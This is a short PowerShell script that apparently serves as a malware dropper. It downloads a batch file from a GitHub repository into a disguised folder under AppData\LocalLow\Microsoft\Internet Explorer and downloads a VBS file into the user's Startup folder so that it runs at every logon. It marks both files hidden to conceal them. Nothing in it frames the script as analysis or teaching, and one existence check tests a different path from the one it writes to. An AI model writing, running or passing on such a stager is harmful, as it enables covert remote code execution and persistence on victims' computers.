try {
    # Download the batch file
    $path = "$env:USERPROFILE\AppData\LocalLow\Microsoft\Internet Explorer\receiver.bat"
    Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/receiver.bat' -OutFile $path
    Write-Host "Download completed."
} catch {
    Write-Error "Failed to download file: $_"
}

try {
    # Hide the batch file if it exists
    if (Test-Path 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat') {
        Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
        Write-Host "File hidden."
    } else {
        Write-Error "File not found."
    }
} catch {
    Write-Error "Failed to hide the file: $_"
}
try{
   $startupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\file.vbs')
   Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/file.vbs' -OutFile $startupPath
} catch {
   Write-Error "Failed to download starter"
}
try {
    # Hide the vbs file if it exists
    if (Test-Path $startupPath) {
        Set-ItemProperty -Path $startupPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
        Write-Host "File hidden."
    } else {
        Write-Error "File not found."
    }
} catch {
    Write-Error "Failed to hide the file: $_"
}

